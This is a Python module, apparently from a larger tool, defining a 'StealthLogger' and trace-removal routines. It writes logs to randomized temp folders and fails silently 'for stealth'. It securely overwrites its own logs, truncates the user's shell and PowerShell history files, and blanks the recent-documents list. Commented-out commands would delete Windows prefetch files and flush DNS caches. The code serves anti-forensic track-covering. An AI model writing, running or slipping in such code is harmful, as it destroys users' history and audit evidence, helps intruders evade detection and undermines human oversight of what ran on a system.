# modules/logger.py
import os
import datetime
import json
import threading
import random
import string
import shutil
import tempfile
import platform
import subprocess

class StealthLogger:
    CRITICAL = 50
    ERROR = 40
    WARNING = 30
    INFO = 20
    DEBUG = 10
    NOTSET = 0
    
    _level_names = {
        CRITICAL: "CRITICAL",
        ERROR: "ERROR",
        WARNING: "WARNING",
        INFO: "INFO",
        DEBUG: "DEBUG",
        NOTSET: "NOTSET",
    }
    
    def __init__(self, name="app", level=INFO, log_file=None, silent=True, self_destruct=True):
        self.name = name
        self.level = level
        self.silent = silent
        self.self_destruct = self_destruct
        self.lock = threading.Lock()
        self.temp_log_files = []
        
        # Create a temporary, randomized log location if logging enabled
        if log_file:
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            self.temp_dir = tempfile.mkdtemp(prefix=f"log_{random_suffix}_")
            self.actual_log_file = os.path.join(self.temp_dir, os.path.basename(log_file))
            self.temp_log_files.append(self.actual_log_file)
        else:
            self.actual_log_file = None
    
    def _log(self, level, msg, **kwargs):
        """Log a message with stealth considerations"""
        if level < self.level:
            return
        
        # Use generic timestamp format that doesn't stand out
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        level_name = self._level_names.get(level, "UNKNOWN")
        
        # Format like a standard system log
        formatted = f"{timestamp} {level_name}: {msg}"
        
        with self.lock:
            if not self.silent:
                print(formatted)
            
            if self.actual_log_file:
                try:
                    with open(self.actual_log_file, "a") as f:
                        f.write(formatted + "\n")
                except:
                    pass  # Silent failure for stealth
    
    def critical(self, msg, **kwargs):
        return self._log(self.CRITICAL, msg, **kwargs)
    
    def error(self, msg, **kwargs):
        return self._log(self.ERROR, msg, **kwargs)
    
    def warning(self, msg, **kwargs):
        return self._log(self.WARNING, msg, **kwargs)
    
    def info(self, msg, **kwargs):
        return self._log(self.INFO, msg, **kwargs)
    
    def debug(self, msg, **kwargs):
        return self._log(self.DEBUG, msg, **kwargs)
    
    def purge_logs(self):
        """Remove all log files created by this logger"""
        try:
            if self.self_destruct:
                # Remove any temp directory we created
                if hasattr(self, 'temp_dir') and os.path.exists(self.temp_dir):
                    shutil.rmtree(self.temp_dir, ignore_errors=True)
                
                # Remove all tracked log files
                for temp_file in self.temp_log_files:
                    if os.path.exists(temp_file):
                        secure_delete(temp_file)
        except:
            pass

def secure_delete(file_path, passes=3):
    """Securely delete a file by overwriting with random data"""
    if not os.path.exists(file_path):
        return
    
    # Get file size
    file_size = os.path.getsize(file_path)
    
    try:
        # Overwrite with random data multiple times
        for i in range(passes):
            with open(file_path, "wb") as f:
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())
        
        # Delete the file
        os.remove(file_path)
    except:
        # If secure delete fails, try normal delete
        try:
            os.remove(file_path)
        except:
            pass

def clean_shell_history():
    """Remove relevant commands from shell history files"""
    history_files = []
    home = os.path.expanduser("~")
    
    # Identify history files based on OS and common shells
    if platform.system() != "Windows":
        history_files = [
            os.path.join(home, ".bash_history"),
            os.path.join(home, ".zsh_history"),
            os.path.join(home, ".history"),
            os.path.join(home, ".ksh_history")
        ]
    else:
        # PowerShell history
        history_files = [
            os.path.join(home, "AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
        ]
    
    # Clear these history files
    for history_file in history_files:
        if os.path.exists(history_file):
            try:
                # This would ideally use pattern matching to remove only relevant commands
                # For complete stealth, we just truncate the file
                with open(history_file, "w") as f:
                    pass
            except:
                pass

def cleanup_all_traces():
    """Remove all logs and traces from the system"""
    # Get logger instance
    logger = get_logger()
    
    # Remove our own logs
    logger.purge_logs()
    
    # Clean shell history
    clean_shell_history()
    
    # Additional cleanup operations
    try:
        # Clear user-specific caches
        home = os.path.expanduser("~")
        cache_dirs = []
        
        if platform.system() == "Linux":
            cache_dirs.append(os.path.join(home, ".cache"))
        elif platform.system() == "Darwin":
            cache_dirs.append(os.path.join(home, "Library/Caches"))
        elif platform.system() == "Windows":
            cache_dirs.append(os.path.join(home, "AppData\\Local\\Temp"))
        
        # Go through system-dependent clean up
        system = platform.system()
        
        if system == "Windows":
            # Clear Windows prefetch files (requires admin)
            # subprocess.run(["cmd", "/c", "del", "/q", "C:\\Windows\\Prefetch\\*.pf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Clear DNS cache
            # subprocess.run(["ipconfig", "/flushdns"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            pass
            
        elif system in ["Linux", "Darwin"]:
            # Clear system caches (requires sudo)
            # subprocess.run(["sudo", "sh", "-c", "sync; echo 3 > /proc/sys/vm/drop_caches"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Clear DNS cache on macOS
            if system == "Darwin":
                # subprocess.run(["sudo", "killall", "-HUP", "mDNSResponder"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                pass
                
            # Clear recent document lists (Ubuntu/GNOME)
            recent_file = os.path.join(home, ".local/share/recently-used.xbel")
            if os.path.exists(recent_file):
                try:
                    with open(recent_file, "w") as f:
                        f.write("<xbel version=\"1.0\"><bookmark:applications></bookmark:applications></xbel>")
                except:
                    pass
        
        return True
    except:
        return False

# Singleton instance
_logger = None

def get_logger(name="app", level=StealthLogger.INFO, log_file=None, silent=True, self_destruct=True):
    """Get the singleton logger instance"""
    global _logger
    if _logger is None:
        _logger = StealthLogger(name, level, log_file, silent, self_destruct)
    return _logger

def silent_log(msg, **kwargs):
    """Legacy function for silent logging"""
    logger = get_logger(silent=True, self_destruct=True)
    return logger.debug(msg, **kwargs)